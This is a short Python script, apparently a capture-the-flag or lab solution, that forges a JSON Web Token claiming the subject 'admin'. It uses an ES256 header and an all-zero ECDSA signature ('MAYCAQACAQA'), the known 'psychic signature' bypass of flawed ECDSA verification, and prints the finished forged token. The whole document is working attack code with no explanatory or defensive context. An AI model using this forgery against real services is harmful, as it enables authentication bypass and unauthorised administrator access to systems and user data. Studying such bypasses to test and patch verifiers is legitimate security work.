import json 
from base64 import urlsafe_b64encode
import hashlib
import hmac 

header = {"alg": "ES256"}
payload = {"sub": "admin"}

contents = urlsafe_b64encode(json.dumps(header, separators=(",",":")).encode()).decode("UTF-8").strip("=") \
+ "." + urlsafe_b64encode(json.dumps(payload, separators=(",",":")).encode()).decode("UTF-8").strip("=")

contents = contents.encode().decode("UTF-8")

# key = "111"
# sig = urlsafe_b64encode(hmac.new(key.encode(), contents.encode(), hashlib.sha256).digest()).decode("UTF-8").strip("=")

print(contents+".MAYCAQACAQA")
# eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA